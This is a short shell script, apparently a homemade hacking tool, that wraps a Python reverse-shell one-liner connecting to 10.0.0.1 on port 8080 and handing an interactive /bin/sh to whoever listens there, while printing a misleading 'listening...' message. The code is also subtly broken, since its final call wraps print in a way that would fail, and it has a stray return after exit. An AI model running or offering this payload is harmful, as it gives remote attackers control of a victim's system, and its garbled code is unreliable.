#!/bin/sh
## Created by Jasutin

clear;

if

printf "\nlistening..."

then

python3 -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1", 8080)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call; print(s); print(p)(["/bin/sh", "-i"]);'

else
	exit 1;
	return 0;

fi;
